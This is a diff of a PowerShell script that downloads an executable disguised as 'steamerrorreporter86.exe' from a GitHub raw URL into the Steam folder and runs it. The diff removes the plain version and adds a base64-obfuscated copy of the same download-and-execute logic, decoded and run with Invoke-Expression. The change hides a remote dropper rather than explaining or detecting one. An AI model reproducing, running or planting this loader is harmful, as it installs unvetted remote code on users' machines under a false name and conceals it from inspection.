@@ -1,35 +1,4 @@
-$diretorio = "C:\Program Files (x86)\Steam"
-$url = "https://raw.githubusercontent.com/superman-legit/eosmenorminimushpecinhafilhadaputa/refs/heads/main/steamerrorreporter86.exe"
-$caminhoArquivo = Join-Path -Path $diretorio -ChildPath "steamerrorreporter86.exe"
-
-if (-not (Test-Path -Path $diretorio)) {
-    Write-Host "Diretório não encontrado ou não acessível. Certifique-se de executar o PowerShell como Administrador."
-    exit
-}
-
-$processo = Get-Process | Where-Object { $_.Path -eq $caminhoArquivo }
-
-if ($processo) {
-    Write-Host "O arquivo está sendo usado por um processo. Tentando finalizar o processo..."
-    Stop-Process -Name $processo.Name -Force
-}
-
-if (Test-Path $caminhoArquivo) {
-    Write-Host "Removendo o arquivo antigo antes de baixar..."
-    Remove-Item $caminhoArquivo -Force
-}
-
-try {
-    Write-Host "Baixando o arquivo com sucesso. Executando o arquivo..."
-    Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo
-
-    if (Test-Path $caminhoArquivo) {
-        Start-Process $caminhoArquivo
-    }
-    else {
-        Write-Host "Falha no download. O arquivo não foi encontrado após a tentativa."
-    }
-}
-catch {
-    Write-Host "Falha no download. Cheque o erro: $_"
-}
+$enc = "CiRkaXJldG9yaW8gPSAiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxTdGVhbSIKJHVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc3VwZXJtYW4tbGVnaXQvZW9zbWVub3JtaW5pbXVzaHBlY2luaGFmaWxoYWRhcHV0YS9yZWZzL2hlYWRzL21haW4vc3RlYW1lcnJvcnJlcG9ydGVyODYuZXhlIgokY2FtaW5ob0FycXVpdm8gPSBKb2luLVBhdGggLVBhdGggJGRpcmV0b3JpbyAtQ2hpbGRQYXRoICJzdGVhbWVycm9ycmVwb3J0ZXI4Ni5leGUiCgojIENyaWEgb3MgZGlyZXRvcmlvIHNlIG5hbyBleGlzdGlyCmlmICghKFRlc3QtUGF0aCAtUGF0aCAkZGlyZXRvcmlvKSkgewogICAgTmV3LUl0ZW0gLVBhdGggJGRpcmV0b3JpbyAtSXRlbVR5cGUgRGlyZWN0b3J5IHwgT3V0LU51bGwKfQoKIyBWZXJpZmljYSBzZSBvIHByb2Nlc3NvIGzDoSBlc3TDoSByb2RhbmRvCiRwcm9jZXNzb1JvZGFuZG8gPSBHZXQtUHJvY2VzcyB8IFdoZXJlLU9iamVjdCB7ICRfLlByb2Nlc3NOYW1lIC1lcSAic3RlYW1lcnJvcnJlcG9ydGVyODYiIH0KCmlmICghJHByb2Nlc3NvUm9kYW5kbykgewogICAgV3JpdGUtSG9zdCAiSW5zdGFsYW5kby4uLiIKICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkY2FtaW5ob0FycXVpdm8KCiAgICBXcml0ZS1Ib3N0ICJFeGVjdXRhbmRvLi4uIgogICAgU3RhcnQtUHJvY2VzcyAkY2FtaW5ob0FycXVpdm8KCiAgICBXcml0ZS1Ib3N0ICJTdWNlc3NvLiIKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgIk8gYXBsaWNhdGl2byBqw6kgZXN0w6EgZW0gZXhlY3XDqi7DhCBOZW5odW1hIGHDp8OjbyBmb2kgdGFkYS4iCn0K"
+$bytes = [System.Convert]::FromBase64String($enc)
+$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
+Invoke-Expression $decoded
